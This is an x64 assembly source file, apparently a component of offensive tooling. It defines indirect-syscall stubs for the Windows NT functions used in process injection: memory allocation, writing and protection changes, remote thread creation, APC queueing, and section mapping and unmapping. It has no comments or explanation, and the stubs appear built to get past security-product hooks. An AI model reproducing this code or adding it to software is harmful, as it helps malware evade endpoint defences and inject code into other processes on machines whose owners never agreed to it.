.code

EXTERN wNtAllocateVirtualMemory:DWORD
EXTERN wNtWriteVirtualMemory:DWORD
EXTERN wNtProtectVirtualMemory:DWORD
EXTERN wNtCreateThreadEx:DWORD
EXTERN wNtQueueApcThread:DWORD
EXTERN wNtCreateSection:DWORD
EXTERN wNtMapViewOfSection:DWORD
EXTERN wNtUnmapViewOfSection:DWORD
EXTERN wNtResumeThread:DWORD
EXTERN wNtClose:DWORD

EXTERN pNtAllocateVirtualMemory:QWORD
EXTERN pNtWriteVirtualMemory:QWORD
EXTERN pNtProtectVirtualMemory:QWORD
EXTERN pNtCreateThreadEx:QWORD
EXTERN pNtQueueApcThread:QWORD
EXTERN pNtCreateSection:QWORD
EXTERN pNtMapViewOfSection:QWORD
EXTERN pNtUnmapViewOfSection:QWORD
EXTERN pNtResumeThread:QWORD
EXTERN pNtClose:QWORD

SysNtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, wNtAllocateVirtualMemory
    jmp qword ptr [pNtAllocateVirtualMemory]
SysNtAllocateVirtualMemory ENDP

SysNtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, wNtWriteVirtualMemory
    jmp qword ptr [pNtWriteVirtualMemory]
SysNtWriteVirtualMemory ENDP

SysNtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, wNtProtectVirtualMemory
    jmp qword ptr [pNtProtectVirtualMemory]
SysNtProtectVirtualMemory ENDP

SysNtCreateThreadEx PROC
    mov r10, rcx
    mov eax, wNtCreateThreadEx
    jmp qword ptr [pNtCreateThreadEx]
SysNtCreateThreadEx ENDP

SysNtQueueApcThread PROC
    mov r10, rcx
    mov eax, wNtQueueApcThread
    jmp qword ptr [pNtQueueApcThread]
SysNtQueueApcThread ENDP

SysNtCreateSection PROC
    mov r10, rcx
    mov eax, wNtCreateSection
    jmp qword ptr [pNtCreateSection]
SysNtCreateSection ENDP

SysNtMapViewOfSection PROC
    mov r10, rcx
    mov eax, wNtMapViewOfSection
    jmp qword ptr [pNtMapViewOfSection]
SysNtMapViewOfSection ENDP

SysNtUnmapViewOfSection PROC
    mov r10, rcx
    mov eax, wNtUnmapViewOfSection
    jmp qword ptr [pNtUnmapViewOfSection]
SysNtUnmapViewOfSection ENDP

SysNtResumeThread PROC
    mov r10, rcx
    mov eax, wNtResumeThread
    jmp qword ptr [pNtResumeThread]
SysNtResumeThread ENDP

SysNtClose PROC
    mov r10, rcx
    mov eax, wNtClose
    jmp qword ptr [pNtClose]
SysNtClose ENDP

end
